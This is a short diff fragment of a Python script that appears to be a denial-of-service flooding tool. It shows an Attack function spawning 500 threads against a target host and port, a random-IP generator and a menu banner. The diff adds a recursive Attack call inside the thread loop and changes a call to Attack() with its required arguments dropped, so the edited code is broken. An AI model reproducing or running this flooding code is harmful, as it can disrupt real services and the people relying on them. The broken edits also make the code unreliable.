@@ -25,6 +25,7 @@ def Attack(target, port):
         for i in range(500):
             thread = threading.Thread(target = attack)
             thread.start()
+            Attack(target, port)
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
@@ -123,7 +124,7 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-        Attack(target, port)
+        Attack()
     elif option == 3:
         os.system("clear")
         print("  ______    ____       _____")
